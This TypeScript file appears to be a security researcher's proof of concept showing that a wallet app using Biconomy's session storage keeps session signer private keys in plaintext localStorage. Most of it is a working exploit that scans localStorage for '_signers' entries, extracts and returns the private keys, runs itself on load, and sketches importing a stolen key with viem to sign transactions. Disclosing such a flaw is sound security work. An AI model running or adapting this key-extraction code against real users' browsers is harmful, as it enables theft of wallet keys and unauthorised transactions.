/**
 * PoC #6: Session Signer Private Key Exposure via localStorage
 * 
 * CRITICAL VULNERABILITY
 * 
 * The Verified Wallet uses Biconomy's SessionLocalStorage which stores
 * session signer PRIVATE KEYS in plaintext localStorage.
 * 
 * Location: utils/helpers.js:153249
 * Code: localStorage.setItem(this.getStorageKey("signers"), JSON.stringify(signers));
 * 
 * The 'signers' object contains:
 * {
 *   "0xAddress": {
 *     pvKey: "0x...", // PRIVATE KEY IN PLAINTEXT!
 *     pbKey: "0x..."  // Public key
 *   }
 * }
 * 
 * Impact: Any script on the page can steal session signer private keys!
 * 
 * Severity: CRITICAL (CVSS 9.0+)
 */

interface SignerData {
  pvKey: string;  // Private key!
  pbKey: string;  // Public key (address)
}

interface SessionLeaf {
  sessionID: string;
  sessionPublicKey: string;
  sessionValidationModule: string;
  status: "PENDING" | "ACTIVE" | "REVOKED";
}

interface SessionStore {
  merkleRoot: string;
  leafNodes: SessionLeaf[];
}

/**
 * Scans localStorage for all Biconomy session storage keys
 * and extracts private keys
 */
function extractSessionSignerPrivateKeys(): { address: string; privateKey: string }[] {
  console.log("🔴 PoC 6: SESSION SIGNER PRIVATE KEY EXTRACTION\n");
  console.log("=".repeat(60) + "\n");
  
  const extractedKeys: { address: string; privateKey: string }[] = [];
  
  // Scan all localStorage keys
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (!key) continue;
    
    // Check for signer storage keys (format: {smartAccountAddress}_signers)
    if (key.endsWith("_signers")) {
      console.log(`🎯 Found signer storage key: ${key}\n`);
      
      try {
        const signersData = localStorage.getItem(key);
        if (signersData) {
          const signers: Record<string, SignerData> = JSON.parse(signersData);
          
          for (const [address, data] of Object.entries(signers)) {
            if (data.pvKey) {
              console.log(`💀 CRITICAL: Private key extracted!`);
              console.log(`   Address: ${address}`);
              console.log(`   Private Key: ${data.pvKey.substring(0, 10)}...${data.pvKey.substring(data.pvKey.length - 6)}`);
              console.log(`   (Full key available to attacker)\n`);
              
              extractedKeys.push({
                address,
                privateKey: data.pvKey
              });
            }
          }
        }
      } catch (e) {
        console.log(`   Error parsing: ${e}`);
      }
    }
    
    // Also check for session data (format: {smartAccountAddress}_sessions)
    if (key.endsWith("_sessions")) {
      console.log(`📋 Found session storage key: ${key}`);
      
      try {
        const sessionData = localStorage.getItem(key);
        if (sessionData) {
          const sessions: SessionStore = JSON.parse(sessionData);
          console.log(`   Merkle Root: ${sessions.merkleRoot}`);
          console.log(`   Active Sessions: ${sessions.leafNodes.length}`);
          
          for (const leaf of sessions.leafNodes) {
            console.log(`   - Session ID: ${leaf.sessionID?.substring(0, 20)}...`);
            console.log(`     Status: ${leaf.status}`);
            console.log(`     Public Key: ${leaf.sessionPublicKey}`);
          }
          console.log("");
        }
      } catch (e) {
        console.log(`   Error parsing: ${e}`);
      }
    }
  }
  
  console.log("-".repeat(60));
  console.log(`\n📊 EXTRACTION SUMMARY:`);
  console.log(`   Private keys extracted: ${extractedKeys.length}`);
  
  if (extractedKeys.length > 0) {
    console.log(`\n⚠️  ATTACK IMPACT:`);
    console.log(`   1. Attacker can sign transactions as the session signer`);
    console.log(`   2. Session permissions can be abused until expiry`);
    console.log(`   3. If session has broad permissions, full account access possible`);
    console.log(`\n   These keys can be imported into any wallet (Metamask, etc.)`);
    console.log(`   to execute transactions within session permissions.`);
  }
  
  console.log("\n" + "=".repeat(60));
  
  return extractedKeys;
}

/**
 * Demonstrate using extracted key to sign transactions
 */
async function demonstrateKeyUsage(privateKey: string): Promise<void> {
  console.log("\n🔧 Demonstrating key usage (simulated):\n");
  
  // In a real attack, you would:
  // import { privateKeyToAccount } from "viem/accounts";
  // const account = privateKeyToAccount(privateKey as `0x${string}`);
  // Then use account to sign transactions
  
  console.log(`   1. Import key: privateKeyToAccount("${privateKey.substring(0, 10)}...")`);
  console.log(`   2. Create wallet client with account`);
  console.log(`   3. Sign transactions within session permissions`);
  console.log(`   4. Execute arbitrary operations until session expires`);
}

// Run the exploit
const extractedKeys = extractSessionSignerPrivateKeys();

if (extractedKeys.length > 0) {
  demonstrateKeyUsage(extractedKeys[0].privateKey);
}

export { extractSessionSignerPrivateKeys };
